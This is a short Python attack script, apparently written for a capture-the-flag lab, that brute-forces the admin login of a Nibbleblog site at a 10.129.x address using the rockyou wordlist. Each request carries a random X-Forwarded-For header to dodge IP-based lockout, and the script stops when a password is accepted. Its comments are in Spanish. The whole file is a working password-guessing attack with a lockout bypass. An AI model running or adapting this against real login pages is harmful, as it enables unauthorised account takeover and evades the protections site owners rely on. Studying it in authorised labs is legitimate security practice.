#!/usr/bin/python3

from pwn import *
import requests
import random
from tqdm import tqdm

limit = 5

def generate_random_ip():
    ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    return ip

def BruteForce():
    attempts = 0
    login_url = "http://10.129.176.138/nibbleblog/admin.php?controller=user&action=login"
    with open("/usr/share/wordlists/rockyou.txt", "r") as wordlist:
        total_lines = sum(1 for _ in wordlist)  # Obtiene el número total de líneas en el archivo
        wordlist.seek(0)  # Reinicia la posición del archivo al principio
        with tqdm(total=total_lines, unit='line') as pbar:  # Inicializa la barra de progreso
            for line in wordlist:
                password = line.strip()
                ip = generate_random_ip()
                data = {
                    'username': 'admin',
                    'password': password
                }
                headers = {
                    'X-Forwarded-For': ip
                }
                p = requests.post(url=login_url, data=data, headers=headers)
                if "Incorrect username or password." in p.text:
                    pbar.set_description(f"Testing password: {password}")
                    pbar.update(1)  # Incrementa la barra de progreso en 1
                    continue
                else:
                    pbar.set_description(f"Password found: {password}")
                    pbar.update(1)  # Incrementa la barra de progreso en 1
                    break  # Termina el bucle si se encuentra la contraseña

if __name__ == '__main__':
    context.log_level = 'info'  # Configura el nivel de registro de pwn tools a 'info'
    BruteForce()
